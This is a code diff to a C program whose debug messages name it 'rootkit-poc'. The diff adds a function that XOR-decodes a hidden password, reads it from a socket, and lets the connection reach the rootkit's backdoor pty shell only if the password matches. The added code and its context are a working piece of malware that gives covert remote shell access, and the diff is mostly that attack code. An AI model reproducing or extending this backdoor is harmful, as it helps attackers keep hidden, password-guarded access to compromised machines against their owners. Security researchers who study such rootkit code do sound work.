@@ -128,6 +128,26 @@ void shell_listener(int sock, int pty) {
     close(pty);
 }
 
+int check_shell_password(int sock) {
+    char buffer[512];
+    char *shell_passwd = strdup(SHELL_PASSWD);
+
+    xor(shell_passwd);
+
+    memset(buffer, 0x00, sizeof(buffer));
+
+    read(sock, buffer, sizeof(buffer));
+
+    if (strstr(buffer, shell_passwd)) {
+        cleanup(shell_passwd, strlen(shell_passwd));
+        return 1;
+    }
+
+    cleanup(shell_passwd, strlen(shell_passwd));
+
+    return 0;
+}
+
 int start_shell(int sock, struct sockaddr *addr) {
     DEBUG("[rootkit-poc]: start_shell called\n");
 
@@ -160,6 +180,12 @@ int start_shell(int sock, struct sockaddr *addr) {
         cleanup(sys_write, strlen(sys_write));
     } else {
         return sock;
+    }
+
+    if (!check_shell_password(sock)) {
+        shutdown(sock, SHUT_RDWR);
+        close(sock);
+        return -1;
     }
 
     DEBUG("[rootkit-poc]: Sending shell message to client\n");
